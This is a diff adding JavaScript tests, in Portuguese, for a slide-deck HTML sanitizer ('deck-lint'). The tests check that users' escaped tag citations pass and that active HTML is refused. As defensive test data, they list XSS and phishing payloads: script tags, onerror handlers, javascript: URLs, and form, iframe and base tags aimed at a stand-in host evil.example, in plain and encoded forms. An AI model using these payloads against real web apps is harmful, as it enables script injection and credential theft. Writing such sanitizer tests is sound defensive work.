@@ -270,3 +270,98 @@ describe('deck-lint — decks REAIS do editor (preservação: nada do que o edit
     assertRejected(d, 'tag_perigosa');
   });
 });
+
+/* ── BE-ED-09: texto que a pessoa DIGITA citando tags (o editor guarda escapado, como o navegador serializa) × HTML ativo ── */
+const typed = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/ /g, '&nbsp;');   // = innerHTML de um nó de texto
+
+describe('deck-lint — BE-ED-09: citar tags em caixas de texto não trava o salvamento; HTML ativo continua recusado', () => {
+  const CITATIONS = [
+    'use a tag <b> para negrito',
+    'if (a < b && c > d)',
+    'use a tag <form> para formulários',
+    'Coloque <link> e <meta> dentro do <head>; feche com </form>',
+    'O elemento <iframe> incorpora outra página; <object> e <embed> são antigos',
+    'tags <template>, <noscript>, <xmp>, <plaintext>, <frameset>, <frame>, <applet>, <isindex> e <base>',
+    'Formulários: <form>…</form> (o envio vai para o próprio site)',
+    'x<y && y>z; a <= b; c >= d; <-- seta -->',
+    'Escreva &lt; para o sinal de menor e &amp; para o "e" comercial',
+    'Use <img src="foto.png" alt="Foto"> e <a href="https://exemplo.com">link</a>',
+    'Use <x:form> só em XML',
+  ];
+  for (const text of CITATIONS) {
+    test(`passa (como o editor guarda): ${text.slice(0, 60)}`, () => {
+      lintDeck(deckWith(typed(text)));                                                             // html de uma caixa de texto
+      const d = structuredClone(REAL.templates[0]); const el = d.slides[0].els.find((e) => e.type === 'text'); el.html = typed(text); lintDeck(d);   // num deck real
+    });
+  }
+  test('as mesmas tags LITERAIS (forma crua = HTML de verdade) continuam recusadas', () => {
+    for (const raw of ['use a tag <form> para formulários', 'Coloque <link> no head', 'O elemento <iframe> incorpora', '<template>x</template>', 'feche com </form>', '<base>', '<x:form>']) assertRejected(deckWith(raw), 'tag_perigosa');
+  });
+  test('citações escapadas que são HTML ATIVO (ou viram, se alguém decodificar duas vezes) continuam recusadas', () => {
+    const ACTIVE = [
+      ['a tag <script> carrega JavaScript', 'tag_perigosa'], ['</script>', 'tag_perigosa'], ['a tag <style> define estilos', 'tag_perigosa'], ['vetores com <svg>', 'tag_perigosa'], ['fórmulas com <math>', 'tag_perigosa'],
+      ['<x:script>', 'tag_perigosa'], ['<iframe src="https://evil.example/">', 'tag_perigosa'], ['<link rel="stylesheet" href="https://evil.example/x.css">', 'tag_perigosa'],
+      ['<meta http-equiv="refresh" content="0;url=https://evil.example/">', 'tag_perigosa'], ['<base href="https://evil.example/">', 'tag_perigosa'], ['<object data="https://evil.example/x">', 'tag_perigosa'],
+      ['<form action="https://evil.example/">', 'tag_perigosa'], ['<form method=post>', 'tag_perigosa'], ['<form', 'tag_perigosa'],
+      ['<form><button formaction="https://evil.example/">Entrar</button></form>', 'atributo_perigoso'], ['<input form="login" name="senha">', 'atributo_perigoso'], ['<isindex action="https://evil.example/">', 'tag_perigosa'],
+      ['<img src=x onerror=alert(1)>', 'atributo_evento'], ['<a href="javascript:alert(1)">x</a>', 'url_perigosa'], ['<iframe srcdoc="x">', 'atributo_perigoso'],
+    ];
+    for (const [text, reason] of ACTIVE) assertRejected(deckWith(typed(text)), reason);
+    // codificação dupla e por percentual também
+    assertRejected(deckWith('&amp;lt;iframe src=//evil.example&amp;gt;'), 'tag_perigosa');
+    assertRejected(deckWith('%3Cform action=//evil.example%3E'), 'tag_perigosa');
+    assertRejected(deckWith('&#60;form&#62;&#60;button formaction=//evil.example&#62;'), 'atributo_perigoso');
+  });
+  test('1 MB de citações escapadas (&lt;form&gt;, &lt;link&gt;&lt;/link&gt;) e "&lt;form" + 1 MB de espaços: tempo linear', () => {
+    for (const s of ['&lt;form&gt;'.repeat(100_000), '&lt;link&gt;&lt;/link&gt;'.repeat(50_000), '&lt;form' + ' '.repeat(1_000_000)]) {
+      const t0 = performance.now(); try { lintDeck(deckWith(s)); } catch (e) { assert.ok(e instanceof HttpError); } const ms = performance.now() - t0; assert.ok(ms < 2500, `${ms.toFixed(0)} ms`);
+    }
+  });
+  test('o corpus de ataques continua TODO recusado (inclusive as formas codificadas de <script>)', () => {
+    for (const { name, value } of ATTACKS) { const e = rejected(deckWith(value)); assert.equal(e.status, 422, name); }
+    for (const { name, value } of ATTACKS.filter((a) => /&lt;|&#|%3C|%25|\\u|\\x|%u/i.test(a.value))) assertRejected({ slides: [{ els: [], notes: value }] }, null, undefined, name);
+  });
+});
+
+describe('deck-lint — details.issues: onde está o problema (slide 1-based e id do elemento), sem ecoar o conteúdo', () => {
+  test('aponta slide e elemento; o texto recusado nunca volta (nem no caminho)', () => {
+    const d = { title: 'T', slides: [{ id: 's1', els: [{ id: 'e1', type: 'text', html: 'ok' }] }, { id: 's2', els: [{ id: 'eA', type: 'text', html: 'ok' }, { id: 'eB', type: 'text', html: '<script>SEGREDO</script>' }] }] };
+    const e = assertRejected(d, 'tag_perigosa');
+    assert.deepEqual(e.details.issues, [{ slide: 2, elementId: 'eB', reason: 'tag_perigosa' }]);
+    const wire = JSON.stringify(e.details); assert.ok(!wire.includes('SEGREDO') && !wire.includes('<'), wire);
+  });
+  test('uma entrada por (slide, elemento, razão) — as formas crua e decodificadas não duplicam; várias razões e elementos aparecem', () => {
+    const d = { slides: [{ els: [{ id: 'a1', html: '<script>1</script>&lt;script&gt;' }, { id: 'a2', html: '<img src=x onerror=1>' }, { id: 'a3', src: 'javascript:alert(1)' }] }] };
+    const e = assertRejected(d);
+    assert.deepEqual(e.details.issues, [{ slide: 1, elementId: 'a1', reason: 'tag_perigosa' }, { slide: 1, elementId: 'a2', reason: 'atributo_evento' }, { slide: 1, elementId: 'a3', reason: 'url_perigosa' }]);
+  });
+  test('problema fora de elemento: notas do slide → só o slide; título/campos do deck → slide nulo', () => {
+    assert.deepEqual(assertRejected({ slides: [{ els: [] }, { els: [], notes: '<script>1</script>' }] }).details.issues, [{ slide: 2, elementId: null, reason: 'tag_perigosa' }]);
+    assert.deepEqual(assertRejected({ title: '<script>1</script>', slides: [] }).details.issues, [{ slide: null, elementId: null, reason: 'tag_perigosa' }]);
+    assert.deepEqual(assertRejected({ slides: [], comments: [{ text: 'javascript:alert(1)' }] }).details.issues, [{ slide: null, elementId: null, reason: 'url_perigosa' }]);
+  });
+  test('dentro de um componente (dados aninhados) e em NOME de propriedade: o elemento é o dono do campo', () => {
+    const comp = { slides: [{ els: [{ id: 'fx9', type: 'fx', kind: 'smart', data: { items: [{ t: 'ok' }, { t: '<svg onload=1>' }] } }] }] };
+    const ci = assertRejected(comp).details.issues;
+    assert.deepEqual([...new Set(ci.map((i) => `${i.slide}|${i.elementId}`))], ['1|fx9']); assert.deepEqual(ci.map((i) => i.reason).sort(), ['atributo_evento', 'tag_perigosa']);
+    const key = { slides: [{ els: [{ id: 'k1', data: { ['<script>']: 1 } }] }] };
+    assert.deepEqual(assertRejected(key).details.issues, [{ slide: 1, elementId: 'k1', reason: 'tag_perigosa' }]);
+  });
+  test('id do elemento que não é identificador simples (ou que é o próprio ataque) vira null', () => {
+    for (const id of ['<script>alert(1)</script>', 'a b', 'x'.repeat(65), 42, null, '']) {
+      const e = assertRejected({ slides: [{ els: [{ id, html: '<script>1</script>' }] }] });
+      assert.deepEqual(e.details.issues.map((i) => [i.slide, i.elementId]), [[1, null]], JSON.stringify(id));
+      assert.ok(!JSON.stringify(e.details).includes('alert'), 'o id hostil não é ecoado');
+    }
+  });
+  test('no máximo 20 issues (300 slides com problema) e findings continua ≤ 10 (compatibilidade)', () => {
+    const e = rejected({ slides: Array.from({ length: 300 }, (_, i) => ({ els: [{ id: 'e' + i, html: '<script>1</script>' }] })) });
+    assert.equal(e.details.issues.length, 20); assert.deepEqual(e.details.issues[0], { slide: 1, elementId: 'e0', reason: 'tag_perigosa' }); assert.deepEqual(e.details.issues[19], { slide: 20, elementId: 'e19', reason: 'tag_perigosa' });
+    assert.ok(e.details.findings.length <= 10);
+  });
+  test('recusa sem lugar definido (estrutura/tamanho) traz issues com slide e elemento nulos; slide que não é objeto aponta o slide', () => {
+    assert.deepEqual(rejected(null).details.issues, [{ slide: null, elementId: null, reason: 'estrutura_invalida' }]);
+    assert.deepEqual(rejected({ slides: [], t: 'a'.repeat(200) }, { maxBytes: 100 }).details.issues, [{ slide: null, elementId: null, reason: 'tamanho_excedido' }]);
+    assert.deepEqual(rejected({ slides: [{}, 5] }).details.issues, [{ slide: 2, elementId: null, reason: 'estrutura_invalida' }]);
+  });
+});
